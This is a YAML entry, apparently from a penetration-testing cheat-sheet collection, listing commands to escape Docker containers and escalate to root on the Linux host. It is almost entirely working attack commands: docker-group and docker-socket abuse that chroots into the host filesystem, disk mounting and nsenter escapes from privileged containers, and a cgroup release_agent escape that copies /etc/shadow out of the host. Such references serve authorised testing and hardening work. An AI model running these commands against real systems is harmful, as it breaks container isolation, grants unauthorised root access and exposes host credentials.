---
description: |
  Escape Docker containers or abuse Docker group membership to escalate privileges on the host system.
command: |
  # Check if running inside a container:
  cat /proc/1/cgroup
  ls /.dockerenv
  hostname

  # Check if user is in the docker group:
  id
  groups

  # Docker group abuse — mount host filesystem:
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh

  # Mounted docker socket — escape via socket:
  ls -la /var/run/docker.sock
  docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh

  # Privileged container — mount host filesystem:
  fdisk -l
  mount /dev/sda1 /mnt
  chroot /mnt

  # Privileged container — nsenter escape:
  nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

  # CAP_SYS_ADMIN — escape via cgroup:
  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
  echo 1 > /tmp/cgrp/x/notify_on_release
  host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
  echo "$host_path/cmd" > /tmp/cgrp/release_agent
  echo '#!/bin/sh' > /cmd
  echo "cat /etc/shadow > $host_path/output" >> /cmd
  chmod a+x /cmd
  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
  cat /output
items:
  - Shell
phase:
  - PrivEsc
target_os:
  - Linux
services: []
techniques:
  - Docker_Escape
references:
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
  - https://gtfobins.github.io/gtfobins/docker/
---
